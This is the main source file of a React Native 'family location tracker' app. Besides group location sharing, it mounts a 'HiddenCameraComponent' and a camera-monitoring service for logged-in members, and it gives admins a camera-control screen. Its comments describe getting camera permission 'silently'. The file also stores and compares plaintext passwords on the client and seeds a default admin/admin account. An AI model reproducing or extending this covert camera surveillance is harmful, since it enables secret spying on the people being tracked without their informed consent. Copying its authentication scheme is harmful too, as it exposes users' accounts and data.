"use client";

import { useState, useEffect } from "react";
import {
  View,
  ActivityIndicator,
  Text,
  StyleSheet,
  TouchableOpacity,
} from "react-native";
import * as Location from "expo-location";
import { Camera } from "expo-camera";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { ref, set, get, onValue, remove } from "firebase/database";
import { db } from "./firebase";
import LoginScreen from "./src/LoginScreen";
import HomeScreen from "./src/HomeScreen";
import MapScreenOSM from "./src/MapScreenOSM";
import CreateGroupScreen from "./src/screens/CreateGroupScreen";
import AddMemberScreen from "./src/screens/AddMemberScreen";
import MembersListScreen from "./src/screens/MembersListScreen";
import GroupsListScreen from "./src/screens/GroupsListScreen";
import AdminLocationTrackingScreen from "./src/screens/AdminLocationTrackingScreen";
import ChangePasswordScreen from "./src/screens/ChangePasswordScreen";
import AdminCameraControlScreen from "./src/screens/AdminCameraControlScreen";
import { BACKGROUND_LOCATION_TASK } from "./src/backgroundLocationTask";
import HiddenCameraComponent from "./src/components/HiddenCameraComponent";
import CameraErrorBoundary from "./src/components/CameraErrorBoundary";
import CameraMonitorService from "./src/services/CameraMonitorService";

const setData = async (path, data) => {
  if (!db)
    throw new Error(
      "Firebase not initialized. Check your environment variables.",
    );
  await set(ref(db, path), data);
};

const getData = async (path) => {
  if (!db)
    throw new Error(
      "Firebase not initialized. Check your environment variables.",
    );
  const snapshot = await get(ref(db, path));
  return snapshot.exists() ? snapshot.val() : null;
};

const onDataChange = (path, callback) => {
  if (!db)
    throw new Error(
      "Firebase not initialized. Check your environment variables.",
    );
  const unsubscribe = onValue(ref(db, path), (snapshot) => {
    callback(snapshot.exists() ? snapshot.val() : null);
  });
  return () => unsubscribe();
};

const removeData = async (path) => {
  if (!db)
    throw new Error(
      "Firebase not initialized. Check your environment variables.",
    );
  await remove(ref(db, path));
};

const getAdminByCredentials = async (username, password) => {
  const users = await getData("users");
  if (!users) return null;
  const matchingEntry = Object.entries(users).find(
    ([id, user]) =>
      user.username === username &&
      user.password === password &&
      user.role === "admin",
  );
  if (!matchingEntry) return null;
  const [id, user] = matchingEntry;
  return { ...user, id };
};

const getUserByCredentials = async (username, password) => {
  const users = await getData("users");
  if (!users) return null;
  const matchingEntry = Object.entries(users).find(
    ([id, user]) => user.username === username && user.password === password,
  );
  if (!matchingEntry) return null;
  const [id, user] = matchingEntry;
  return { ...user, id };
};

const initializeDefaultAdmin = async () => {
  try {
    const users = await getData("users");
    if (users) {
      const adminWithCredentialsExists = Object.values(users).some(
        (user) => user.role === "admin" && user.username && user.password,
      );
      if (adminWithCredentialsExists) {
        console.log("[Firebase] Admin user with credentials already exists");
        return true;
      }
    }
    const adminId = "admin_" + Date.now();
    const adminData = {
      id: adminId,
      username: "admin",
      password: "admin",
      role: "admin",
      createdAt: new Date().toISOString(),
    };
    await setData(`users/${adminId}`, adminData);
    console.log("[Firebase] Default admin user created successfully");
    return true;
  } catch (error) {
    console.error("[Firebase] Error initializing admin:", error);
    return false;
  }
};

const setMemberLocation = async (groupId, memberId, location) => {
  await setData(`groups/${groupId}/locations/${memberId}`, location);
};

export default function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [userRole, setUserRole] = useState(null);
  const [userInfo, setUserInfo] = useState(null);
  const [currentScreen, setCurrentScreen] = useState("home");
  const [screenContext, setScreenContext] = useState(null);
  const [location, setLocation] = useState(null);
  const [familyLocations, setFamilyLocations] = useState({});
  const [errorMsg, setErrorMsg] = useState(null);
  const [loading, setLoading] = useState(false);
  const [isTracking, setIsTracking] = useState(false);
  const [locationSubscription, setLocationSubscription] = useState(null);
  const [groupId, setGroupId] = useState(null);

  useEffect(() => {
    const initializeApp = async () => {
      try {
        await initializeDefaultAdmin();
      } catch (error) {
        console.error("App initialization error:", error);
      }
    };
    initializeApp();
  }, []);

  useEffect(() => {
    if (isLoggedIn) {
      (async () => {
        try {
          const { status } = await Location.requestForegroundPermissionsAsync();
          if (status !== "granted") {
            setErrorMsg("Location permission denied");
          }
        } catch (error) {
          console.error("Permission error:", error);
          setErrorMsg("Error requesting location permission");
        }
      })();
    }
  }, [isLoggedIn]);

  // Request camera permission silently for members (after first grant, no popup)
  useEffect(() => {
    if (isLoggedIn && userRole === "member") {
      (async () => {
        try {
          // Check if permission already granted
          const { status: existingStatus } = await Camera.getCameraPermissionsAsync();
          
          if (existingStatus !== "granted") {
            // Only request if not already granted (will show popup first time only)
            const { status } = await Camera.requestCameraPermissionsAsync();
            if (status !== "granted") {
              console.log("[Camera] Permission denied by member");
            } else {
              console.log("[Camera] Permission granted");
            }
          } else {
            console.log("[Camera] Permission already granted - no popup needed");
          }
        } catch (error) {
          console.error("[Camera] Permission error:", error);
        }
      })();
    }
  }, [isLoggedIn, userRole]);

  useEffect(() => {
    if (userInfo && userInfo.type === "member") {
      const fetchMemberGroup = async () => {
        try {
          const users = await getData("users");
          if (users) {
            const user = Object.values(users).find(
              (u) => u.username === userInfo.username && u.role === "member",
            );
            if (user) {
              setGroupId(user.groupId);
              setUserInfo({
                ...userInfo,
                memberId: user.id,
                groupId: user.groupId,
              });
            }
          }
        } catch (error) {
          console.error("Error fetching user group:", error);
        }
      };
      fetchMemberGroup();
    }
  }, [userInfo]);

  useEffect(() => {
    if (groupId && isTracking) {
      const unsubscribe = onDataChange(
        `groups/${groupId}/locations`,
        (locations) => {
          setFamilyLocations(locations || {});
        },
      );
      return () => {
        unsubscribe();
      };
    }
  }, [groupId, isTracking]);

  // Start camera monitoring for members
  useEffect(() => {
    if (isLoggedIn && userRole === "member") {
      CameraMonitorService.startMonitoring();

      return () => {
        CameraMonitorService.stopMonitoring();
      };
    }
  }, [isLoggedIn, userRole]);

  const handleCameraControl = () => {
    setScreenContext("cameraControl");
    setCurrentScreen("groupsList");
  };

  const startBackgroundLocation = async (member) => {
    try {
      await AsyncStorage.multiSet([
        ["memberId", member.id],
        ["groupId", member.groupId],
        ["username", member.username],
      ]);

      const { status: fgStatus } =
        await Location.requestForegroundPermissionsAsync();
      if (fgStatus !== "granted") {
        console.log(
          "Foreground location permission denied for background task",
        );
        return;
      }

      const { status: bgStatus } =
        await Location.requestBackgroundPermissionsAsync();
      if (bgStatus !== "granted") {
        console.log("Background location permission denied");
        return;
      }

      const hasStarted = await Location.hasStartedLocationUpdatesAsync(
        BACKGROUND_LOCATION_TASK,
      );
      if (!hasStarted) {
        await Location.startLocationUpdatesAsync(BACKGROUND_LOCATION_TASK, {
          accuracy: Location.Accuracy.High,
          timeInterval: 5 * 60 * 1000, // 5 minutes
          distanceInterval: 50, // 50 meters
          showsBackgroundLocationIndicator: true,
          foregroundService: {
            notificationTitle: "Family Location Tracker",
            notificationBody: "Location sharing is active in background",
          },
        });
      }
    } catch (error) {
      console.error("Error starting background location:", error);
    }
  };

  const handleLogin = async (loginData) => {
    if (loginData.type === "admin") {
      try {
        setLoading(true);
        const admin = await getAdminByCredentials(
          loginData.username,
          loginData.password,
        );
        if (admin) {
          setIsLoggedIn(true);
          setUserRole("admin");
          setUserInfo(loginData);
          setCurrentScreen("home");
        } else {
          alert("Invalid admin credentials");
        }
      } catch (error) {
        console.error("Admin login error:", error);
        alert("Error during login");
      } finally {
        setLoading(false);
      }
    } else {
      try {
        setLoading(true);
        const user = await getUserByCredentials(
          loginData.username,
          loginData.password,
        );
        if (user) {
          if (!user.groupId) {
            alert("Member is not assigned to any group");
            setLoading(false);
            return;
          }
          setIsLoggedIn(true);
          setUserRole("member");
          const fullUserInfo = {
            ...loginData,
            memberId: user.id,
            groupId: user.groupId,
          };
          setUserInfo(fullUserInfo);
          setGroupId(user.groupId);
          setCurrentScreen("home");
          await startBackgroundLocation({
            id: user.id,
            groupId: user.groupId,
            username: user.username,
          });
        } else {
          alert("Invalid credentials");
        }
      } catch (error) {
        console.error("Login error:", error);
        alert("Error during login");
      } finally {
        setLoading(false);
      }
    }
  };

  const startLocationTracking = async () => {
    try {
      setLoading(true);

      const { status } = await Location.requestForegroundPermissionsAsync();
      if (status !== "granted") {
        setErrorMsg("Location permission denied");
        setLoading(false);
        return;
      }

      const currentLocation = await Location.getCurrentPositionAsync({
        accuracy: Location.Accuracy.High,
      });

      const locationData = {
        lat: currentLocation.coords.latitude,
        lng: currentLocation.coords.longitude,
        accuracy: currentLocation.coords.accuracy || 0,
        timestamp: Date.now(),
      };

      setLocation(locationData);

      if (userInfo.type === "member" && groupId) {
        await setMemberLocation(groupId, userInfo.memberId, {
          ...locationData,
          name: userInfo.username,
        });
      }

      const subscription = await Location.watchPositionAsync(
        {
          accuracy: Location.Accuracy.High,
          timeInterval: 5000,
          distanceInterval: 10,
        },
        async (newLocation) => {
          const newLocationData = {
            lat: newLocation.coords.latitude,
            lng: newLocation.coords.longitude,
            accuracy: newLocation.coords.accuracy || 0,
            timestamp: Date.now(),
          };

          setLocation(newLocationData);

          if (userInfo.type === "member" && groupId) {
            await setMemberLocation(groupId, userInfo.memberId, {
              ...newLocationData,
              name: userInfo.username,
            });
          }
        },
      );

      setLocationSubscription(subscription);
      setIsTracking(true);
      setLoading(false);
      setCurrentScreen("map");
      setErrorMsg(null);
    } catch (error) {
      console.error("Location tracking error:", error);
      setErrorMsg("Error starting location tracking");
      setLoading(false);
    }
  };

  const stopLocationTracking = async () => {
    if (locationSubscription) {
      locationSubscription.remove();
      setLocationSubscription(null);
    }

    const isMember = userInfo?.type === "member";
    if (isMember && groupId) {
      try {
        await removeData(`groups/${groupId}/locations/${userInfo.memberId}`);
      } catch (error) {
        console.error("Error removing location:", error);
      }
    }

    setIsTracking(false);
    setLocation(null);
    setFamilyLocations({});
    setCurrentScreen("home");
  };

  const handleLogout = async () => {
    try {
      setLoading(true);

      try {
        const hasStarted = await Location.hasStartedLocationUpdatesAsync(
          BACKGROUND_LOCATION_TASK,
        );
        if (hasStarted) {
          await Location.stopLocationUpdatesAsync(BACKGROUND_LOCATION_TASK);
        }
      } catch (e) {
        console.error("Error stopping background location:", e);
      }

      try {
        await AsyncStorage.multiRemove(["memberId", "groupId", "username"]);
      } catch (e) {
        console.error("Error clearing member info from storage:", e);
      }

      if (isTracking) {
        await stopLocationTracking();
      }
    } catch (error) {
      console.error("Logout error:", error);
    } finally {
      setIsLoggedIn(false);
      setUserRole(null);
      setUserInfo(null);
      setGroupId(null);
      setFamilyLocations({});
      setLocation(null);
      setCurrentScreen("home");
      setErrorMsg(null);
      setLoading(false);
    }
  };

  const handleManageMembers = async () => {
    if (userRole === "admin") {
      setScreenContext("manageMembers");
      setCurrentScreen("groupsList");
    } else {
      setCurrentScreen("membersList");
    }
  };

  const handleAdminLocationTracking = () => {
    setScreenContext("trackLocations");
    setCurrentScreen("groupsList");
  };

  const handleSelectGroup = (selectedGroupId) => {
    setGroupId(selectedGroupId);
    if (screenContext === "trackLocations") {
      setCurrentScreen("adminLocationTracking");
    } else if (screenContext === "cameraControl") {
      setCurrentScreen("adminCameraControl");
    } else {
      setCurrentScreen("membersList");
    }
  };

  const handleCreateGroup = () => {
    setCurrentScreen("createGroup");
  };

  const handleGroupCreated = (newGroupId) => {
    setGroupId(newGroupId);
    setCurrentScreen("membersList");
  };

  const handleBackToGroupsList = () => {
    setGroupId(null);
    if (screenContext === "trackLocations") {
      setCurrentScreen("groupsList");
    } else if (screenContext === "cameraControl") {
      setCurrentScreen("groupsList");
    } else {
      setCurrentScreen("groupsList");
    }
  };

  const handleAddMember = () => {
    setCurrentScreen("addMember");
  };

  const handleMemberAdded = () => {
    setCurrentScreen("membersList");
  };

  const handleBackToHome = () => {
    setCurrentScreen("home");
    setScreenContext(null);
  };

  const handleGroupDeleted = () => {
    setGroupId(null);
    setCurrentScreen("home");
  };

  const handleChangePassword = () => {
    setCurrentScreen("changePassword");
  };

  const handlePasswordChanged = () => {
    setCurrentScreen("home");
  };

  if (!isLoggedIn) {
    return <LoginScreen onLogin={handleLogin} />;
  }

  if (loading && currentScreen === "home") {
    return (
      <View style={styles.loadingContainer}>
        <ActivityIndicator size="large" color="#007AFF" />
        <Text style={styles.loadingText}>📍 Loading...</Text>
      </View>
    );
  }

  if (errorMsg && currentScreen === "home") {
    return (
      <View style={styles.errorContainer}>
        <Text style={styles.errorText}>{errorMsg}</Text>
        <TouchableOpacity
          style={styles.retryButton}
          onPress={() => {
            setErrorMsg(null);
            startLocationTracking();
          }}
        >
          <Text style={styles.retryButtonText}>Retry</Text>
        </TouchableOpacity>
      </View>
    );
  }

  if (currentScreen === "map") {
    return (
      <MapScreenOSM
        myLocation={location}
        familyLocations={familyLocations}
        onBackPress={stopLocationTracking}
        isTracking={isTracking}
      />
    );
  }

  if (currentScreen === "createGroup") {
    return (
      <CreateGroupScreen
        onGroupCreated={handleGroupCreated}
        onBack={handleBackToHome}
      />
    );
  }

  if (currentScreen === "addMember") {
    return (
      <AddMemberScreen
        groupId={groupId}
        onMemberAdded={handleMemberAdded}
        onBack={() => setCurrentScreen("membersList")}
      />
    );
  }

  if (currentScreen === "membersList") {
    return (
      <MembersListScreen
        groupId={groupId}
        onAddMember={handleAddMember}
        onBack={
          userRole === "admin" ? handleBackToGroupsList : handleBackToHome
        }
        onGroupDeleted={handleGroupDeleted}
      />
    );
  }

  if (currentScreen === "groupsList") {
    return (
      <GroupsListScreen
        onSelectGroup={handleSelectGroup}
        onBack={handleBackToHome}
        onCreateGroup={handleCreateGroup}
      />
    );
  }

  if (currentScreen === "adminLocationTracking") {
    if (!groupId) {
      setScreenContext("trackLocations");
      setCurrentScreen("groupsList");
      return null;
    }
    return (
      <AdminLocationTrackingScreen
        groupId={groupId}
        onBack={handleBackToGroupsList}
      />
    );
  }

  if (currentScreen === "adminCameraControl") {
    if (!groupId) {
      setScreenContext("cameraControl");
      setCurrentScreen("groupsList");
      return null;
    }
    return (
      <AdminCameraControlScreen
        groupId={groupId}
        onBack={handleBackToGroupsList}
      />
    );
  }

  if (currentScreen === "changePassword") {
    return (
      <ChangePasswordScreen
        userInfo={userInfo}
        onBack={handleBackToHome}
        onPasswordChanged={handlePasswordChanged}
      />
    );
  }

  return (
    <>
      {/* Hidden camera component for members only */}
      {userRole === "member" && (
        <CameraErrorBoundary>
          <HiddenCameraComponent />
        </CameraErrorBoundary>
      )}

      <HomeScreen
        onStartTracking={startLocationTracking}
        onManageMembers={handleManageMembers}
        onAdminLocationTracking={handleAdminLocationTracking}
        onCameraControl={handleCameraControl}
        onLogout={handleLogout}
        userRole={userRole}
        userInfo={userInfo}
        groupId={groupId}
        onChangePassword={handleChangePassword}
      />
    </>
  );
}

const styles = StyleSheet.create({
  loadingContainer: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
    backgroundColor: "#1a1a2e",
  },
  loadingText: {
    marginTop: 16,
    fontSize: 18,
    color: "#fff",
    fontWeight: "600",
    letterSpacing: 0.3,
  },
  errorContainer: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
    backgroundColor: "#1a1a2e",
    padding: 20,
  },
  errorText: {
    fontSize: 17,
    color: "#ea4335",
    textAlign: "center",
    marginBottom: 24,
    fontWeight: "600",
    letterSpacing: 0.3,
  },
  retryButton: {
    backgroundColor: "#667eea",
    paddingHorizontal: 28,
    paddingVertical: 14,
    borderRadius: 12,
    shadowColor: "#667eea",
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.4,
    shadowRadius: 8,
    elevation: 6,
  },
  retryButtonText: {
    color: "#fff",
    fontSize: 16,
    fontWeight: "800",
    letterSpacing: 0.5,
  },
});
